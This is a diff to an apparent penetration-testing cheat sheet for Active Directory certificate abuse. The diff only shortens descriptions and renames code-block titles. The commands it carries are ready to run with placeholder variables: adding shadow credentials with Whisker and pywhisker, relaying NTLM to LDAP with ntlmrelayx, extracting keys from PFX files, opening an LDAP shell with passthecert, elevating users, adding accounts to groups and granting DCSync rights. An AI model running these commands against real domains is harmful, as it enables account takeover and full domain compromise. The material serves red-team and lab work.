@@ -4,11 +4,9 @@
 
 ### List shadow credentials
 
-List shadow credentials with Pass The Cert / Whisker.
-
 List `msDS-KeyCredentialLink` entries on a target object.
 
-```powershell title:"Pass the Cert / Whisker List Shadow Credentials"
+```powershell title:"Pass The Cert / Whisker List shadow credential entries with Whisker"
 .\Whisker.exe list /target:"$target_samname" /domain:"$domain" /dc:"$dc_name"
 ```
 <!-- cheat
@@ -19,11 +17,9 @@ var dc_name
 
 ### Add shadow credentials
 
-Add shadow credentials with Pass The Cert / Whisker.
-
 Generate a key pair, add a KeyCredential to the target, and export a PFX.
 
-```powershell title:"Pass the Cert / Whisker Add Shadow Credentials"
+```powershell title:"Pass The Cert / Whisker Add shadow credentials with Whisker"
 .\Whisker.exe add /target:"$target_samname" /domain:"$domain" /dc:"$dc_name" /path:"$pfx_file" /password:"$pfx_pass"
 ```
 <!-- cheat
@@ -36,11 +32,9 @@ var pfx_pass
 
 ### Remove shadow credential
 
-Remove shadow credential with Pass The Cert / Whisker.
-
 Remove a KeyCredential by DeviceID.
 
-```powershell title:"Pass the Cert / Whisker Remove Shadow Credential"
+```powershell title:"Pass The Cert / Whisker Remove shadow credential with Whisker"
 .\Whisker.exe remove /target:"$target_samname" /domain:"$domain" /dc:"$dc_name" /remove:"$device_id"
 ```
 <!-- cheat
@@ -54,11 +48,9 @@ var device_id
 
 ### List shadow credentials 2
 
-List shadow credentials 2 with Pass The Cert / Whisker.
-
 List KeyCredential entries from Linux.
 
-```sh title:"Pass the Cert / Whisker List Shadow Credentials 2"
+```sh title:"Pass The Cert / Whisker List shadow credentials with pywhisker"
 pywhisker.py -d "$domain" -u "$user" -p "$pass" --target "$target_samname" --action list
 ```
 <!-- cheat
@@ -70,11 +62,9 @@ var target_samname
 
 ### Add shadow credentials 2
 
-Add shadow credentials 2 with Pass The Cert / Whisker.
-
 Add a KeyCredential and write the generated PFX material to a named file.
 
-```sh title:"Pass the Cert / Whisker Add Shadow Credentials 2"
+```sh title:"Pass The Cert / Whisker Add shadow credentials with pywhisker"
 pywhisker.py -d "$domain" -u "$user" -p "$pass" --target "$target_samname" --action add --filename "$output_name"
 ```
 <!-- cheat
@@ -87,11 +77,9 @@ var output_name
 
 ### Remove shadow credential 2
 
-Remove shadow credential 2 with Pass The Cert / Whisker.
-
 Remove a KeyCredential by DeviceID.
 
-```sh title:"Pass the Cert / Whisker Remove Shadow Credential 2"
+```sh title:"Pass The Cert / Whisker Remove shadow credential with pywhisker"
 pywhisker.py -d "$domain" -u "$user" -p "$pass" --target "$target_samname" --action remove --device-id "$device_id"
 ```
 <!-- cheat
@@ -104,11 +92,9 @@ var device_id
 
 ### Relay shadow credentials
 
-Dump relay shadow credentials with Pass The Cert / Whisker.
-
 Use ntlmrelayx to add shadow credentials during LDAP relay.
 
-```sh title:"Pass the Cert / Whisker Dump Relay Shadow Credentials"
+```sh title:"Pass The Cert / Whisker Relay to LDAP and add shadow credentials"
 ntlmrelayx.py -t "ldap://$dc_fqdn" --shadow-credentials --shadow-target "$target_samname"
 ```
 <!-- cheat
@@ -120,11 +106,9 @@ var target_samname
 
 ### Extract cert from PFX
 
-Extract cert from PFX with Pass The Cert / Whisker.
-
 Extract only the certificate for Schannel LDAP auth.
 
-```sh title:"Pass the Cert / Whisker Extract Cert from PFX"
+```sh title:"Pass The Cert / Whisker Extract certificate PEM from PFX"
 certipy cert -pfx "$pfx_file" -nokey -out "$cert_file"
 ```
 <!-- cheat
@@ -134,11 +118,9 @@ var cert_file
 
 ### Extract key from PFX
 
-Extract key from PFX with Pass The Cert / Whisker.
-
 Extract only the private key for Schannel LDAP auth.
 
-```sh title:"Pass the Cert / Whisker Extract Key from PFX"
+```sh title:"Pass The Cert / Whisker Extract key PEM from PFX"
 certipy cert -pfx "$pfx_file" -nocert -out "$key_file"
 ```
 <!-- cheat
@@ -148,11 +130,9 @@ var key_file
 
 ### LDAP shell
 
-Spawn LDAP shell with Pass The Cert / Whisker.
-
 Open an LDAP shell through Schannel with a certificate and key.
 
-```sh title:"Pass the Cert / Whisker Spawn LDAP Shell"
+```sh title:"Pass The Cert / Whisker Open Schannel LDAP shell with passthecert"
 passthecert.py -action ldap-shell -crt "$cert_file" -key "$key_file" -domain "$domain" -dc-ip "$rhost_ip"
 ```
 <!-- cheat
@@ -164,11 +144,9 @@ var domain
 
 ### Elevate user
 
-Run elevate user with Pass The Cert / Whisker.
-
 Use Schannel LDAP auth to grant a target user elevated rights.
 
-```sh title:"Pass the Cert / Whisker Run Elevate User"
+```sh title:"Pass The Cert / Whisker Elevate user with passthecert.py"
 passthecert.py -action modify_user -crt "$cert_file" -key "$key_file" -domain "$domain" -dc-ip "$rhost_ip" -target "$target_samname" -elevate
 ```
 <!-- cheat
@@ -183,11 +161,9 @@ var target_samname
 
 ### Add account to group
 
-Add account to group with Pass The Cert / Whisker.
-
 Use the Windows C# PassTheCert tool to add an account to a group over LDAPS.
 
-```powershell title:"Pass the Cert / Whisker Add Account to Group"
+```powershell title:"Pass The Cert / Whisker Add account to group with PassTheCert.exe"
 .\PassTheCert.exe --server "$dc_fqdn" --cert-path "$pfx_file" --add-account-to-group --target "$target_group_dn" --account "$target_user_dn"
 ```
 <!-- cheat
@@ -201,22 +177,18 @@ var target_user_dn
 
 ### Import module
 
-Run import module with Pass The Cert / Whisker.
-
 Load Invoke-PassTheCert in PowerShell.
 
-```powershell title:"Pass the Cert / Whisker Run Import Module"
+```powershell title:"Pass The Cert / Whisker Import Invoke-PassTheCert"
 Import-Module .\Invoke-PassTheCert.ps1
 ```
 <!-- cheat -->
 
 ### Create LDAP connection
 
-Create LDAP connection with Pass The Cert / Whisker.
-
 Create a Schannel-backed LDAP connection from a PFX.
 
-```powershell title:"Pass the Cert / Whisker Create LDAP Connection"
+```powershell title:"Pass The Cert / Whisker Create Schannel LDAP connection"
 $ldap = Invoke-PassTheCert-GetLDAPConnectionInstance -Server "$rhost_ip" -Port 636 -Certificate "$pfx_file"
 ```
 <!-- cheat
@@ -226,11 +198,9 @@ var pfx_file
 
 ### Add group member
 
-Add group member with Pass The Cert / Whisker.
-
 Add a user to a group over the certificate-backed LDAP connection.
 
-```powershell title:"Pass the Cert / Whisker Add Group Member"
+```powershell title:"Pass The Cert / Whisker Add group member with Invoke-PassTheCert"
 Invoke-PassTheCert -Action AddGroupMember -LdapConnection $ldap -Identity "$target_user_dn" -GroupDN "$target_group_dn"
 ```
 <!-- cheat
@@ -241,11 +211,9 @@ var ldap
 
 ### Grant DCSync
 
-Run grant DCSync with Pass The Cert / Whisker.
-
 Grant DCSync rights over the domain object using certificate-backed LDAP.
 
-```powershell title:"Pass the Cert / Whisker Run Grant DCSync"
+```powershell title:"Pass The Cert / Whisker Grant DCSync with Invoke-PassTheCert"
 Invoke-PassTheCert -Action 'LDAPExploit' -LdapConnection $ldap -Exploit 'DCSync' -Identity "$controlled_user_dn" -Target "$domain_dn"
 ```
 <!-- cheat
